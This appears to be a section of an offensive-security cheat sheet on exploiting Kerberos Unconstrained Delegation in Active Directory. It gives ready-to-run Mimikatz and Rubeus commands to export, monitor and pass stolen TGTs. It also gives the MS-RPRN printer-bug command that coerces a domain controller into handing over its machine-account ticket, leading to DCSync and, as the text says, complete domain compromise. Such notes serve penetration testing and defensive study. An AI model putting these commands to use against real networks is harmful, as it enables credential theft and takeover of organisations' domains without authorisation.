Unconstrained Delegation can be set on a _frontend service_ (e.g., an IIS web server) to allow it to delegate on behalf of a user to _any service in the domain_ (towards a _backend service_, such as an MSSQL database).

DACL UAC property: `TrustedForDelegation`.
#### Exploitation

With administrative privileges on a server with Unconstrained Delegation set, we can dump the TGTs for other users that have a connection. If we do this successfully, we can impersonate the victim user towards any service in the domain.

With Mimikatz:

```plaintext
sekurlsa::tickets /export
kerberos::ptt c:\path\to\ticket.kirbi
```

Or with Rubeus:

```powershell
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x5379f2 /nowrap
.\Rubeus.exe ptt /ticket:doIFSDCC[...]
```

We can also gain the hash for a domain controller machine account, if that DC is vulnerable to the printer bug. If we do this successfully, we can DCSync the domain controller (see below) to completely compromise the current domain.

On the server with Unconstrained Delegation, monitor for new tickets with Rubeus.

```powershell
.\Rubeus.exe monitor /interval:5 /nowrap
```

From attacking machine, entice the Domain Controller to connect using the printer bug. Binary from [here](https://github.com/leechristensen/SpoolSample).

```powershell
.\MS-RPRN.exe \\dc.targetdomain.com \\unconstrained-server.targetdomain.com
```

The TGT for the machine account of the DC should come in in the first session. We can pass this ticket into our current session to gain DCSync privileges (see below).

```powershell
.\Rubeus.exe ptt /ticket:doIFxTCCBc...
```